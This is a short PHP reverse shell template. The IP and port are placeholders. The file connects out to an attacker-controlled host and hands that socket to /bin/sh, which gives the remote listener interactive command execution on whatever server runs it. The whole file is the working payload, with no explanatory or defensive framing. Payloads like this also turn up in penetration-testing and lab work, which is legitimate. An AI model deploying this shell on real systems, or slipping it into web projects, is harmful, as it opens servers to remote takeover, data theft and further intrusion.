<?php
$ip = '{IP}';
$port = {PORT};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
